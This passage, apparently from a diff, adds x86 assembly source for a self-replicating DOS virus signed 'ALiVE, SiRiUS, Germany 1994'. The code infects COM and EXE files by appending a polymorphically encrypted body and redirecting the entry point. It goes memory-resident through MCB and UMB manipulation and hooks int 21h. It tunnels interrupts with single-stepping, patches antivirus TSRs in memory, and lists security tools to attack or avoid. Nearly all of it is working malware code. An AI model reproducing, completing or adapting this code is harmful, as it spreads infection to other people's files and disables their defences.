+        mov     Old_Attribs,al
+        mov     es:[di.SFT_File_Attr],0
+
+; Get file length directly from the SFT and save it
+        mov     ax,es:[di.SFT_File_SizeLo]
+        mov     File_SizeLo,ax
+        mov     ax,es:[di.SFT_File_SizeHi]
+        mov     File_SizeHi,ax
+
+; File pointer to TOF using the SFT
+        xor     ax,ax
+        mov     es:[di.SFT_Curr_OfsLo],ax
+        mov     es:[di.SFT_Curr_OfsHi],ax
+
+; Read the file header from file
+        mov     AH,3fh
+        mov     bx,Handle
+        mov     DX,ofs Buffer
+        mov     CX,ReadBuf_Length
+        call    INT21
+        JC      go_leave          ; Quit on error
+
+
+; Save the file header in a safe place (OrigHeaderBuffer)
+        push    cs
+        pop     es
+        mov     si,ofs Buffer
+        mov     di,ofs OrigHeaderBuffer
+        mov     cx,ReadBuf_Length
+        cld
+        rep     movsb
+
+IF FL_INF_BREAK
+        call    TestSpareIntervall
+        jc      go_leave
+ENDIF
+
+; Check if EXE or COM file
+        cmp     word ptr Buffer.Buf_0h,'ZM'
+        jz      Process_EXE
+        cmp     word ptr Buffer.Buf_0h,'MZ'
+        jz      Process_EXE
+
+; Process a COM file !
+
+        mov    FileType_Byte,File_Mark_COM
+        mov    SI,ofs Buffer            ; Starting at CS:BUFFER
+        push   CS                       ; ES:=cs
+        pop    ES
+
+        mov    DI,ofs Old_ExeValues
+        movsw
+        movsb
+
+        mov     ax,File_SizeLo
+        mov     Victim_Len,ax
+
+        cmp     AX,F_Min_LengthCOM    ;Don't infect files less than xxxx bytes
+        jb      go_leave
+        cmp     AX,F_Max_LengthCOM    ;Or bigger than xxxx bytes
+        ja      go_leave
+
+        push    ax
+
+; COM-Files which are divisible by 100 will not be infected
+        xor     dx,dx
+        mov     cx,100
+        div     cx                      ; AX := DX|AX div CX
+        or      dx,dx                   ; DX := DX|AX mod CX
+        pop     ax
+        jnz     not_mod100
+
+go_leave:
+        jmp     Leave_And_Close
+
+not_mod100:
+        sub     ax,3                    ; correction
+        mov     byte ptr [Buffer],0E9H  ; = JMP NEAR Opcode
+        mov     word ptr [Buffer+1],ax  ; virus position
+        jmp     Attach
+
+;============================================================================
+
+Process_EXE:
+        mov    FileType_Byte,File_Mark_EXE
+
+; Dont infect to big/small EXE-files !
+        mov     word ptr AX,Buffer.BUF_4h  ; EXE size in 512 byte pages
+        cmp     AX,F_Min_LengthEXE  ; Don't infect files less than xxxx pages
+        JB      go_leave
+
+        cmp     AX,F_Max_LengthEXE  ; Or bigger than xxxx pages
+        JA      go_leave
+
+; Skip WINDOWS files
+        cmp     word ptr cs:[ofs Buffer.Buf_18h],40h
+        jz      go_leave
+
+; It's OK!  Process it now !
+        les     ax,dword ptr Buffer.Buf_14h        ;Entry_Point_Disp
+        mov     Old_IP,ax
+        mov     Old_CS,es
+
+        les     ax,Dword Ptr Buffer.Buf_eh         ;Stack_Disp
+        mov     Old_SS,ax
+        mov     Old_SP,es
+
+        mov     ax,Buffer.Buf_8h               ; = Header size in paras
+        mov     cl,4
+        shl     ax,cl                   ; Convert to byte-format
+
+        push    ax                      ; Save header size
+
+; Get file size from SFT
+        mov     dx,File_SizeHi
+        mov     ax,File_SizeLo
+
+        pop     bx                      ; = Header size
+        push    ax                      ; Save filesize
+        push    dx                      ;  --
+        sub     ax,bx                   ; DX:AX := file size - header size
+        sbb     dx,0
+        mov     cx,10h                  ; Convert to seg:ofs format
+        div     cx                      ; DX:AX := (DX:AX) / 10h
+        mov     Buffer.Buf_14h,dx              ; New IP
+        mov     Buffer.Buf_16h,ax              ; New CS
+        mov     Victim_Len,dx
+        inc     ax                      ; Avoid the "K" TB-flag (seems unecessary)
+        mov     Buffer.Buf_eh,ax               ; New SS
+        mov     Buffer.Buf_10h,0               ; New SP
+        pop     dx
+        pop     ax                      ; = File size
+        add     ax,Nominal_VLength      ; Lo-word
+        adc     dx,0                    ; Hi-word
+        push    ax                      ; Lo-word
+        shr     ax,9                    ;
+        ror     dx,9
+        stc
+        adc     dx,ax
+        pop     ax
+        and     ah,1                    ; Mod 512
+        mov     Buffer.Buf_4h,dx               ; Size in pages (rounded up)
+        mov     Buffer.Buf_2h,ax               ; Size of last page (in bytes)
+
+; This part processes the virus-code-affection
+; to a COM/EXE file !
+
+ATTACH:
+;PB:01
+        push    cs                     ; ES:=CS
+        pop     es
+        push    cs                     ; DS:=CS
+        pop     ds
+
+; Handle the origin signatures
+
+        mov     di,ofs InfNr            ; Increment infection nr.
+        call    Increment4ASCIINumber
+        mov     di,ofs SumNr            ; Increment infection nr.
+        call    Increment4ASCIINumber
+
+; Create a 6-ASCII Number
+        mov     di,ofs MyStamp
+        mov     cx,6
+CreateNextByte:
+        mov     ax,10
+        call    Random
+        add     al,'0'
+        stosb
+        loop    CreateNextByte
+
+; Update the birth-date/time
+        mov     ah,4
+        int     1ah             ;==> CH=Century CL=Year DH=Month DL=Day
+        mov     di,ofs Birth
+
+        mov     al,dh           ; Day
+        shr     al,4
+        add     al,'0'
+        stosb
+        mov     al,dh
+        and     al,(8+4+2+1)
+        add     al,'0'
+        stosb
+
+        inc     di
+
+        mov     al,dl           ; Month
+        shr     al,4
+        add     al,'0'
+        stosb
+        mov     al,dl
+        and     al,(8+4+2+1)
+        add     al,'0'
+        stosb
+
+        inc     di
+
+        mov     al,cl           ; Year
+        shr     al,4
+        add     al,'0'
+        stosb
+        mov     al,cl
+        and     al,(8+4+2+1)
+        add     al,'0'
+        stosb
+        inc     di
+
+; Get RTC time
+        mov     ah,2
+        int     1ah
+        mov     al,ch           ; Hours
+        shr     al,4
+        add     al,'0'
+        stosb
+        mov     al,ch
+        and     al,(8+4+2+1)
+        add     al,'0'
+        stosb
+
+        inc     di
+
+        mov     al,cl           ; Minutes
+        shr     al,4
+        add     al,'0'
+        stosb
+        mov     al,cl
+        and     al,(8+4+2+1)
+        add     al,'0'
+        stosb
+;PE:01
+
+
+; Create decryptor and encrypt
+; virusbody using polymorphism
+
+        call    SPM
+
+;PB:02
+
+;----------------------------------------------------------------------------
+; Write-to-file part of infection
+;----------------------------------------------------------------------------
+; File pointer to EOF
+        mov     bx,Handle
+
+        push    Rout_Get_SFT
+        call    Use_Routine
+
+        push    es:[di.SFT_File_SizeHi]
+        pop     es:[di.SFT_Curr_OfsHi]
+        push    es:[di.SFT_File_SizeLo]
+        pop     es:[di.SFT_Curr_OfsLo]
+
+; Save the original file header (now in
+; OrigHeaderBuffer) to the end of the file
+; ( == last 1Ah bytes )
+
+        push    di ds es
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+        mov     cx,ReadBuf_Length
+        mov     si,ofs OrigHeaderBuffer
+        mov     di,ofs Enc_Buffer + Nominal_VLength - ReadBuf_Length
+        cld
+        rep     movsb
+        pop     es ds di
+
+;---
+
+; Copy encrypted virus to file
+        mov     ah,40h                    
+        mov     dx,ofs Enc_Buffer
+        mov     cx,Nominal_VLength
+        call    tINT21
+
+; File pointer to TOF using the SFT
+        xor     ax,ax
+        mov     es:[di.SFT_Curr_OfsLo],ax
+        mov     es:[di.SFT_Curr_OfsHi],ax
+
+; Write the changed Buffer to TOF
+        mov     AH,40h                          ; Write to file
+        mov     DX,ofs Buffer
+        mov     CX,ReadBuf_Length
+        call    tINT21
+
+        mov     AX,5701h
+        mov     cx,Old_Time
+        mov     dx,Old_Date
+        and     cl,11100000b
+        or      cl,Time_ID                      ; Mark with Time-ID
+        call    tINT21
+
+;PE:02
+
+Leave_And_Close:
+
+
+;----------------------------------------------------------------------------
+; If 'Close' is the current process then return back
+;----------------------------------------------------------------------------
+        cmp     cs:Flag_InfectClose,1
+        jne     Not_InfectionOnClose
+        ret
+
+
+Not_InfectionOnClose:
+        mov     AH,3EH                  ; close this file
+        mov     bx,Handle
+        call    tINT21
+
+        cmp     DriveNr,2
+        jb      Need_To_Leave
+
+; Restore file attributes
+        mov     ax,4301h
+        mov     cl,Old_Attribs
+        mov     ch,0
+        lds     dx,dword ptr cs:NamePtr
+        call    tINT21
+
+Need_To_Leave:
+
+;PE:03
+
+        pop     DX                      ; Clear stack
+        pop     es ds
+        popa
+        ret
+Infection endp
+Infection_End equ $
+
+
+;============================================================================
+; TSR-installation (thanks to NB and NeuroKnight)
+;============================================================================
+Memory_Installation proc near
+
+; Save the PSP
+        push    ds es
+        mov     cs:[bp+OldPSP],ds
+
+; Bestimme die Grîsse des Konv. Speichers (640kB=>0a000h)
+        push    0
+        pop     ds
+        mov     di,ds:[413h]    ; RAM in kB
+        shl     di,6            ; konvertiere in Segment Adresse
+
+        mov     Byte Ptr cs:[bp+Alloc_Status],Allocated_None
+
+; MCB-AllokationsStrategie lesen
+        mov     ax,5800h
+        int     21h
+        mov     Word Ptr cs:[bp+Mem_Strat],ax
+
+; Lese UMB Link Status, DOS 5.0+ / DOS>5.0 ==> C=1, AX=1
+        mov     ax,5802h
+        int     21h                  
+        mov     Byte Ptr cs:[bp+UMB_Strat],al
+
+; Setze neue MCB-AllokationsStrategie
+        mov     ax,5801h
+        mov     bx,81h
+; 80h First fit (Hi/Lo)
+; 81h Best fit  (Hi/Lo)
+; 82h Last Fit  (Hi/Lo)
+        int     21h
+
+; Set new UMB Link State
+        mov     ax,5803h
+        mov     bx,1            ; 1=MCB+UMB
+        int     21h
+        jc      AskForXMS       ; CY -> DosVersion kleiner 5.00
+
+; éndere BlockGrîsse
+        mov     es,cs:[bp+OldPSP]
+        mov     ah,4Ah
+        mov     bx,0FFFFh
+        int     21h
+
+; Make MCB smaller
+        sub     bx,Reserve_Mem +1
+        mov     ah,4Ah
+        int     21h
+
+; Allocate memory for virus
+        mov     bx,Reserve_Mem
+        mov     ah,48h
+        int     21h
+        mov     es,ax
+        jc      AskForXMS
+
+; Ist der UMB oberhalb des konv. Speichers ?
+        cmp     ax,di           ; DI war konventioneller RAM
+        jae     UMBAllocated
+
+; Anderenfalls versuche UMB vom HIMEM.SYS zu bekommen
+; Frage ob XMS-Manager installiert ist
+AskForXMS:
+        mov     ax,4300h
+        int     2fh
+        cmp     al,80h          ; 80h=Yes
+        jne     NoXMSInstalled
+
+; Finde Himem-EntryPoint (ES:BX)
+        mov     ax,4310h
+        int     2fh
+        mov     cs:[bp+HimemEP_Ofs],bx
+        mov     cs:[bp+HimemEP_Seg],es
+
+; Fordere UMB Speicher vom XMS-Manager an
+        mov     ah,10h
+        mov     dx,0ffffh       ; Gesamten Speicher anfordern
+        call    DWord Ptr cs:[bp+HimemEP_Ofs]
+        cmp     bl,0b0h         ; 0b0h=OK, kleinerer Block vorhanden
+                                ; DX=BlockGrîsse
+        jnz     NoXMSBlockFree
+
+; Fordere UMB Speicher vom XMS-Manager an  (ganzen freien Block)
+        mov     ah,10h
+        call    DWord Ptr cs:[bp+HimemEP_Ofs]
+        or      ax,ax           ; AX(0)=Fehler AX(1)=Ok.
+        jz      NoXMSBlockFree
+        mov     es,bx           ; BX=Seg des Blocks
+
+UMBAllocated:
+        mov     Byte Ptr cs:[bp+Alloc_Status],Allocated_UMB
+
+; Markiere den Virus-MCB als Teil von DOS
+        mov     ax,es           ; ES=neuer Block
+        dec     ax
+        mov     ds,ax
+        xor     si,si
+;;;        mov     Word Ptr ds:[si+1],8  ; markiere mit DOS
+
+; Lade WirtsMCB nach DS
+        mov     ax,cs:[bp+OldPSP]
+        dec     ax
+        push    ax
+
+; Ist der Virus-MCB der letzte MCB ?
+        cmp     Byte Ptr ds:[si],'Z'
+        pop     ds
+        jnz     NotLastMCB      ; nicht letzter
+
+; Markiere den WirtsMCB als letzten
+;;;        mov     Byte Ptr ds:[si],'Z'
+        jmp     SHORT DoneMCB
+
+NotLastMCB:
+; Setze den WirtsMCB auf den Nachfolger von Virus-MCB
+        mov     ax,ds:[3]
+        add     ax,Reserve_Mem +1
+        mov     ds:[3],ax
+
+DoneMCB:
+NoXMSInstalled:
+NoXMSBlockFree:
+
+; Wiederherstellen alter MCB-AllokationsStrategie und UMB-Link-Status
+        mov     bx,Word Ptr cs:[bp+Mem_Strat]
+        mov     ax,5801h
+        int     21h
+
+        mov     bl,Byte Ptr cs:[bp+UMB_Strat]
+        mov     bh,0
+        mov     ax,5803h
+        int     21h
+
+        cmp     Byte Ptr cs:[bp+Alloc_Status],Allocated_UMB
+        jz      UMBWasAllocated
+
+; Sonst alloziere Speicher durch Manipulation der MCBs
+        mov     ds,cs:[bp+OldPSP]
+        push    ds
+        pop     es              ; ES=PSP-Segment des Blocks
+        mov     ah,4ah
+        mov     bx,-1
+        int     21h             ; BX=>Grîsse des MCB
+
+        xor     si,si
+        mov     ax,Reserve_Mem
+        sub     ds:[si+2],ax    ; PSP:2 = Seg des ersten freien bytes nach
+        sub     bx,ax           ;         diesem MCB
+        mov     ah,4ah          ; Verleinere den MCB-Umfang
+        int     21h             ; 'Legalisiere' es durch DOS
+
+        mov     ax,ds           ; AX=Speicher fÅr den Virus, DS=PSP
+        add     ax,bx           ; BX=MCB vor dem Virus
+
+        mov     es,ax           ; Vir-MCB wird zu DOS-MCB
+        mov     Word Ptr es:[1],-1 ;;;3223 ;;; 8
+
+        inc     ax              ; MCB-->PSP
+        mov     es,ax           ; ES=PSP des Virus
+
+; Mark the currebnt MCB as last in the MCB-Chain
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax
+;;;        mov     Byte Ptr ds:[si],'Z'
+
+UMBWasAllocated:
+
+; Find the Segment of first MCB in the System
+        push    es
+        mov     ah,52h
+        int     21h             ; -> ES:BX
+        mov     ax,es:[bx-2]
+        mov     cs:[bp+FirstMCB],ax
+        pop     es
+
+; Copy virus-body w/o decryptor to TOM, so the offsets in the interrupt
+; are equal to those in this sample file
+        push    cs
+        pop     ds
+        lea     si,[bp+Encrypted_Code]
+        mov     di,ofs Encrypted_Code
+        mov     cx,Nominal_VLength
+        repz    movsb                   
+        push    es
+
+; Springe in den VirusCode im hohen Speicher
+        push    cs                       ; Prepare later return to host at
+        lea     si,[bp+ofs LowEntryBack] ; LeaveHost
+        push    si
+
+        push    es              ; Prepare the jump to ES:MemEntryPoint
+        push    ofs HighEntry   
+
+        retf                    ; Jump
+
+HighEntry:
+        push    cs
+        pop     ds
+
+        call    Randomize
+
+IF FL_SLEEP
+; Set up the "sleeping-time"
+        push    0
+        pop     ds
+        mov     ax,word ptr ds:[46ch]       ; lo,  DX:AX
+        mov     dx,word ptr ds:[46ch+2]     ; hi
+        add     ax,SleepIntervall
+        adc     dx,0
+        push    cs
+        pop     ds
+        mov     Slp_Lo,ax
+        mov     Slp_Hi,dx
+ENDIF
+
+; Increase our generation nr. and handle the stamps
+        mov     di,ofs GenNr
+        call    Increment4ASCIINumber
+
+; Zero the InfNr
+        mov     di,ofs InfNr
+        push    cs
+        pop     es
+        mov     ax,'00'
+        stosw
+        stosw
+
+        mov     si,ofs MyStamp
+        mov     di,ofs PaStamp
+        movsw
+        movsw
+        movsw
+
+; Zero spare time
+        xor     ax,ax
+        mov     TimerCell_1,ax
+        mov     TimerCell_2,ax
+
+; RETF nach LowEntryBack im WirtsPSP
+        retf
+
+LowEntryBack:
+
+; Set up int 21h handler
+        pop     es
+        push    0
+        pop     ds
+
+        cli
+        mov     word ptr ds:[4*21h+2],es
+        mov     word ptr ds:[4*21h],ofs NewInt_21
+        sti
+
+; Restore PSP (=ES=DS) for EXEs !
+        pop     es ds
+        ret
+Memory_Installation endp
+Memory_Installation_End equ     $
+
+
+
+;============================================================================
+;  Trace interrupts 21 and 2F
+;============================================================================
+Trace_Interrupts proc near
+
+; zero flag
+        mov     cs:[bp]+TracerSuccess,0
+
+
+; Save the PSP
+        push    ds es
+        mov     cs:[bp+OldPSP],ds
+
+; Get int 21 handler and save it
+        push    0
+        pop     es
+        les     bx,es:[4*21h]
+        mov     cs:[bp]+OldInt21_Ofs,bx
+        mov     cs:[bp]+OldInt21_Seg,es
+
+;  Trace Int-21
+
+; Int-1 Vektor sichern
+        push    0
+        pop     ds
+        les     ax,ds:[1*4]
+        mov     cs:[bp]+OldInt1_ofs,ax
+        mov     cs:[bp]+OldInt1_seg,es
+
+; Int-1 Vector set
+        lea     ax,[bp]+offset n_TracerInt1
+        mov     ds:[1*4]  ,ax
+        mov     ds:[1*4+2],cs
+
+; Determine the segment of DOS-Kernel
+        push    es
+        mov     ah,52h          ; DOS Segment nach ES:BX
+        int     21h
+        mov     cs:[bp]+n_SegDOS,es
+        add     cs:[bp]+n_SegDOS,10h   ; DOS Segment + 10 Paragraphen
+        pop     es
+
+; Int-Emulation
+        pushf
+
+; Start the tracing
+        pushf
+        pop     ax
+        or      ah,00000001b
+        push    ax
+        popf
+
+
+; Trace into Int-21
+        mov     ah,30h
+        db 2Eh,0FFh,9Eh      ; = CALL FAR DWORD PTR CS:[xxxx]
+        dw ofs OldInt21_Ofs
+
+        push    cs
+        pop     ds
+
+        mov     ax,cs:[bp]+TracerTmp_Seg
+        mov     cs:[bp]+TracedInt21_Seg,ax
+        mov     ax,cs:[bp]+TracerTmp_Ofs
+        mov     cs:[bp]+TracedInt21_Ofs,ax
+
+
+; successful
+        cmp     cs:[bp]+TracerSuccess,1
+        jz      n_TracerSuccessed
+
+; not successful
+        push    cs
+        pop     ds
+        mov     ax,cs:[bp]+OldInt21_Ofs
+        mov     cs:[bp]+TracedInt21_Ofs,ax
+        mov     ax,cs:[bp]+OldInt21_Seg
+        mov     cs:[bp]+TracedInt21_Seg,ax
+
+n_TracerSuccessed:
+
+; zero flag
+        mov     cs:[bp]+TracerSuccess,0
+
+; Trace in den Int-2F
+        pushf
+        push    cs
+        lea     ax,[bp]+ofs Back_2F_Tracer
+        push    ax
+
+; Starte den EinzelschrittModus
+        pushf
+        pop     ax
+        or      ah,00000001b
+        push    ax
+        popf
+
+; Go on!
+        push    0
+        pop     ds
+        push    ds:[2fh*4 +2]  ; seg
+        push    ds:[2fh*4]     ; ofs
+        xor     ax,ax
+        retf
+
+Back_2F_Tracer:
+        push    cs
+        pop     ds
+
+        cmp     cs:[bp]+TracerSuccess,1
+        jz      Int2F_Tracer_Successed
+
+        push    0
+        pop     ds
+        push    ds:[2fh*4 +2]  ; seg
+        push    ds:[2fh*4]     ; ofs
+        push    cs
+        pop     ds
+        pop     cs:[bp]+TracedInt2F_Ofs
+        pop     cs:[bp]+TracedInt2F_Seg
+
+        jmp     Int2F_Tracer_Failed
+
+
+Int2F_Tracer_Successed:
+        mov     ax,cs:[bp]+TracerTmp_Seg
+        mov     cs:[bp]+TracedInt2F_Seg,ax
+        mov     ax,cs:[bp]+TracerTmp_Ofs
+        mov     cs:[bp]+TracedInt2F_Ofs,ax
+
+Int2F_Tracer_Failed:
+
+; Old Int 1 restore
+        push    cs
+        pop     ds
+        push    0
+        pop     es
+        lea     si,[bp]+offset OldInt1_ofs
+        mov     di,4*1
+        cld
+        movsw
+        movsw
+
+; Restore PSP (=ES=DS) for EXEs !
+        pop     es ds
+        ret
+Trace_Interrupts endp
+
+
+
+;============================================================================
+;  Int-01 single-step procedure
+;============================================================================
+
+;  SP --> 0000  BP           +0
+;         0000  AX           +2
+;         0000  IP tr        +4
+;         0000  CS tr        +6
+;         0000  FL tr        +8
+
+n_TracerInt1 proc near
+        push    ax si bp es
+
+        call    tn_delta
+tn_delta:
+        pop     si
+        sub     si, ofs tn_delta
+        mov     bp,sp
+
+; Lade neuen CS ins AX-Register
+        mov     ax,ss:[bp+6 +4]
+
+; Patch several AV-TSRs in memory
+        push    si
+        cli
+        mov     es,ax                       ; seg
+        mov     si,ss:[bp+4 +4]             ; ofs
+
+; Patch TBDRIVER
+        cmp     word ptr es:[si],05EBh
+        jnz     n_noTB_to_patch
+        cmp     byte ptr es:[si+2],0EAh
+        jnz     n_noTB_to_patch
+        mov     word ptr es:[si],9090h
+n_noTB_to_patch:
+
+; Patch VIRSTOP
+        cmp     word ptr es:[si],909Ch
+        jnz     n_noVS_to_patch
+        cmp     word ptr es:[si+2],2EFBh
+        jnz     n_noVS_to_patch
+        mov     word ptr es:[si],42EBh
+n_noVS_to_patch:
+
+; Patch VSAFE (i21+i13)
+        cmp     word ptr es:[si]  ,45EAh
+        jnz     n_noVSF_to_patch
+        cmp     word ptr es:[si+5],80FBh
+        jnz     n_noVSF_to_patch
+        cmp     word ptr es:[si+7],0FAFCh
+        jnz     n_noVSF_to_patch
+
+        mov     word ptr es:[si+1],086Dh        ; i21
+        mov     word ptr es:[352h],0FBE9h       ; i13
+        mov     byte ptr es:[352h+2],01h        ; i13
+n_noVSF_to_patch:
+
+; Patch VIREX.COM (i21)
+        cmp     word ptr es:[si]  , 3DFBh
+        jnz     n_noVIREX_to_patch
+        cmp     word ptr es:[si+2],0FF0Fh
+        jnz     n_noVIREX_to_patch
+        cmp     word ptr es:[si+4], 0D75h
+        jnz     n_noVIREX_to_patch
+
+        mov     byte ptr es:[si+23],00h
+
+n_noVIREX_to_patch:
+        sti
+        pop     si
+
+; ---
+
+; Lade neuen CS ins AX-Register
+        mov     ax,ss:[bp+6 +4]
+
+; Haben wir den EP in DOS gefunden ?
+        cmp     ax,0000h
+        org     $-2
+n_SegDOS  dw      0000h
+        ja      n_ExitTracer
+
+; Int EP sichern
+        mov     cs:[si]+TracerTmp_Seg,ax     ; seg
+        mov     ax,ss:[bp+4 +4]              ; ofs
+        mov     cs:[si]+TracerTmp_Ofs,ax
+
+        mov     cs:[si]+TracerSuccess,1      ; Tracer war erfolgreich
+
+; Und das Tracen beenden
+        and     Byte Ptr ss:[bp+8+1 +4],11111110b
+n_ExitTracer:
+        pop     es bp si ax
+        iret
+n_TracerInt1 endp
+
+Trace_Interrupts_End equ $
+;----------------------------------------------------------------------------
+
+
+
+
+;============================================================================
+;  Scanns the MCB-Chain (Fields 8-9),  Signature in DX
+;  found --> ZR, else (not found) --> NZ
+;============================================================================
+ScanMCB   proc near
+        pusha
+        push    ds
+
+        push    es
+        mov     ah,52h
+        int     21h             ; -> ES:BX
+        push    es:[bx-2]
+        pop     ds
+        pop     es
+
+        xor     si,si
+CheckNextMCB:
+        cmp     Byte Ptr ds:[si],'M'
+        jz      McbOk
+        cmp     Byte Ptr ds:[si],'Z'
+        jnz     smExit
+McbOk:
+        cmp     Word Ptr ds:[si+8],dx
+        jz      ResidentAV
+        mov     ax,ds
+        add     ax,ds:[si+3]
+        inc     ax
+        mov     ds,ax
+        jmp     short CheckNextMCB
+ResidentAV:
+smExit:
+        pop     ds
+        popa
+        ret
+ScanMCB   endp
+ScanMCB_End     equ     $
+
+
+
+
+;============================================================================
+; Check if file-name to run/open is (EXE v COM) !
+;  Input: DS:SI = Ext       Output: Match-->ZR, else -->NZ
+;============================================================================
+CheckExtensionForExec proc near
+        lodsb
+        and     al,0DFH
+        cmp     al,'C'
+        jz      MaybeCom
+        cmp     al,'E'
+        jz      MaybeExe
+        ret
+MaybeCom:
+        lodsw
+        and     ax,0DFDFH
+        cmp     ax,'MO'
+        ret
+MaybeExe:
+        lodsw
+        and     ax,0DFDFH
+        cmp     ax,'EX'
+        ret
+CheckExtensionForExec endp
+CheckExtensionForExec_End       equ     $
+
+
+
+
+;============================================================================
+; Anti AV CheckTabelle
+;============================================================================
+; --> Attack the execution:
+; nemesis                               ; Get it, if you dont have it!
+; svs
+; ssc
+
+; --> Just dont infect:
+; tb*
+; f-prot
+; -v
+; virstop
+; clean
+; command
+; win
+; msav
+
+AV_Table_Attack         equ     $
+        db "NE"
+        db "SS"
+        db "SV"
+AV_Table_Attack_End     equ     $
+
+AV_Table_Ignore         equ     $
+        db "VP"
+        db "AV"
+        db "VI"
+        db "F-"
+        db "TB"
+        db "IM"
+        db "-D"
+        db "-U"
+        db "-V"
+        db "CL"
+        db "CO"         ; COMMAND.COM (bug?)
+        db "MS"
+        db "ME"
+        db "WI"
+AV_Table_Ignore_End     equ     $
+
+
+IF FL_INF_BREAK
+;============================================================================
+; Tests if enough time passed since last infection
+;       Output: CY = Wait     NC = Ok, may proceed
+;============================================================================
+TestSpareIntervall proc near
+        pusha
+        push    ds
+        push    0
+        pop     ds
+        mov     Word Ptr ax,ds:[46ch]
+        mov     Word Ptr bx,ds:[46ch+2]     ; BX:AX = Ticks
+        push    cs
+        pop     ds
+        cmp     bx,TimerCell_2
+        ja      HourPassed
+        cmp     ax,TimerCell_1
+        jb      WaitMore
+HourPassed:
+        add     ax,SpareTime
+        adc     bx,0
+        mov     TimerCell_1,ax
+        mov     TimerCell_2,bx
+        clc
+WaitMore:
+        pop     ds
+        popa
+        ret
+TestSpareIntervall endp
+ENDIF
+
+
+;============================================================================
+; Show the Copyright and Exit
+;============================================================================
+DisplayCopyright proc near
+        cmp     Word Ptr ds:[80h],2003h   ; = 3,BLANC
+        jnz     SkipCR
+        cmp     Word Ptr ds:[82h],'LA'    ; = 'AL'
+        jnz     SkipCR
+
+        push    ds
+        mov     ah,9
+        lea     dx,[bp+Sign]
+        push    cs
+        pop     ds
+        int     21h
+        pop     ds
+        mov     ax,4c00h
+        int     21h
+SkipCR: ret
+DisplayCopyright endp
+DisplayCopyright_End    equ     $
+
+;----------------------------------------------------------------------------
+
+Sign:   db      13,10
+        db      "<-<<<  ALiVE  >>>->  Programmed by SiRiUS, Germany 1994"
+        db      13,10
+        db      13,10
+
+        db      "FiRST NAME",9,"["
+MyStamp db      '000000'
+        db      "]"
+        db      13,10
+
+        db      "LAST NAME",9,"["
+PaStamp db      '000000'
+        db      "]"
+        db      13,10
+
+        db      "BiRTHDaY",9,"["
+Birth   db      '00-00-00 00:00'
+        db      "]"
+        db      13,10
+
+        db      "HEiR",9,9,"["
+InfNr   db      '0000'
+        db      "]"
+        db      13,10
+
+        db      "SUM",9,9,"["
+SumNr   db      '0000'
+        db      "]"
+        db      13,10
+
+        db      "GENERATioN",9,"["
+GenNr   db      '0000'
+        db      "]",0
+        db      13,10
+        db      "$"
+;----------------------------------------------------------------------------
+
+
+
+;============================================================================
+; Input CS:DI = @ of ASCII number to increment
+;============================================================================
+Increment4ASCIINumber proc near
+        mov     cx,3
+        add     di,3
+PrevDigit:
+        cmp     byte ptr cs:[di],'9'
+        jnz     IncNow
+        mov     byte ptr cs:[di],'0'
+        dec     di
+        loop    PrevDigit
+IncNow:
+        inc     byte ptr cs:[di]
+        ret
+Increment4ASCIINumber_End equ $
+Increment4ASCIINumber endp
+
+
+
+;============================================================================
+; Get the SFT-@ to ES:DI  
+;   Input: BX=Handle, preserves BX
+;============================================================================
+Get_SFT proc near
+; Get the number of SFT referred to opened file
+        push    bx
+        mov     ax,1220h    ; => ES:DI points to SFT-number
+        call    tINT2F
+        mov     bl,es:[di]
+; Get address of SFT
+        mov     ax,1216h    ; => ES:DI points to SFT of current open file
+        call    tINT2F
+        pop     bx
+        ret
+Get_SFT endp
+Get_SFT_End     equ     $
+
+
+;============================================================================
+;
+; Decrypts a procedure,
+;   ..executes it..
+;      ..and crypts it.
+;
+; ( its all fully reentrant ! )
+;
+;============================================================================
+Use_Routine proc near
+; SS:[SP+2] = Routine Nr.
+        push    ofs Back_From_Routine
+        push    1111h
+
+        pusha
+        pushf
+        push    ds
+
+        call    reloc
+reloc:  pop     bx
+        sub     bx,ofs reloc
+
+; SS:[SP+2+24] = Routine Nr.
+
+        mov     bp,sp
+        mov     ax,ss:[bp+2+24]
+
+        add     ss:[bp+22],bx           ; Back_From_Routine-Ofs anpassen
+
+        mov     ah,5
+        mul     ah
+        push    cs
+        pop     ds
+
+        mov     si,ofs Use_Routine_Table
+        add     si,bx
+        add     si,ax
+        mov     word ptr di,cs:[si.Rout_Offset]
+        add     di,bx
+
+        nop
+        mov     bp,sp
+        mov     ss:[bp+20],di
+        nop
+
+        mov     word ptr cx,cs:[si.Rout_Length]
+        mov     byte ptr al,cs:[si.Rout_Key]
+        cld
+
+NextByteOfRoutine_1:
+        xor     byte ptr cs:[di],al
+        inc     di
+        loop    NextByteOfRoutine_1
+        jmp     short $+2
+
+        pop     ds
+        popf
+        popa
+        ret
+
+Back_From_Routine:
+        pusha
+        pushf
+        push    ds
+
+        call    reloc2                  ; relocate...
+reloc2: pop     bx
+        sub     bx,ofs reloc2
+
+        push    bp                      ; get Routine Number from stack
+        mov     bp,sp
+        mov     ax,ss:[bp+18h]
+        pop     bp
+
+
+        mov     ah,5
+        mul     ah
+        push    cs
+        pop     ds
+
+        mov     si,ofs Use_Routine_Table
+        add     si,bx
+        add     si,ax
+
+        mov     word ptr di,cs:[si.Rout_Offset]
+        add     di,bx
+        in      al,40h                            ; get random value
+        mov     byte ptr cs:[si.Rout_Key],al
+        mov     word ptr cx,cs:[si.Rout_Length]
+        cld
+
+NextByteOfRoutine_2:
+        xor     byte ptr cs:[di],al
+        inc     di
+        loop    NextByteOfRoutine_2
+        jmp     short $+2
+
+; Correct Stack (prepare)
+        mov     ax,ofs poppy
+        add     ax,bx
+        mov     cs:[poppy][bx],ax
+
+        pop     ds
+        popf
+        popa
+
+; Correct Stack
+        push    bp
+        mov     bp,sp
+        push    ss:[bp+2]
+        pop     ss:[bp+4]
+        pop     bp
+        pop     cs:[1234]
+        org     $-2
+poppy   dw      ?
+        ret
+Use_Routine endp
+
+;----------------------------------------------------------------------------
+
+Routine STRUC
+        Rout_Offset     dw      ?
+        Rout_Length     dw      ?
+        Rout_Key        db      ?
+Routine ENDS
+
+Rout_ReadFromHandle        =    0
+Rout_GetSetHandleDateTime  =    1
+Rout_Get_SFT               =    2
+Rout_TestIfDoStealth       =    3
+Rout_CheckExtensionForExec =    4
+Rout_DosDir                =    5
+Rout_DosFindFile           =    6
+Rout_DisplayCopyright      =    7
+Rout_SeekToEOF             =    8
+Rout_Trace_Interrupts      =    9
+Rout_WriteToHandle         =    10
+Rout_ScanMCB               =    11
+
+Use_Routine_Table       equ     $
+        Rout_0  Routine <ofs ReadFromHandle       , ReadFromHandle_End        - ReadFromHandle       , 0>
